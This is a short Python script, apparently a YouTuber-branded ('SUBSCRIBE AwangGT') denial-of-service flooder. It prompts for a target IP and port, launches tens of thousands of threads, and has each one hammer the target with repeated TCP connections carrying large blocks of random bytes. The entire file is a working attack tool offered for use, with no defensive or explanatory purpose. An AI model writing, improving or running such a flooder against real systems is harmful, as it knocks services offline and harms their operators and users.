
import random
import socket
import threading
import time

print(" SUBSCRIBE AwangGT ")
ip = str(input(" IP : "))
port = int(input(" Port : "))
kimak = str(input("ENTER TO START ATTACK :"))
times = 10000
threads = 90048
def run2():
	data = random._urandom(90048)
	i = random.choice(("[-]","[+]","[#]","[*]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"SENT ")
		except:
			s.close()
			print(i +"ATTACK SUCCES ")

for y in range(threads):
		th = threading.Thread(target = run2)
		th.start()
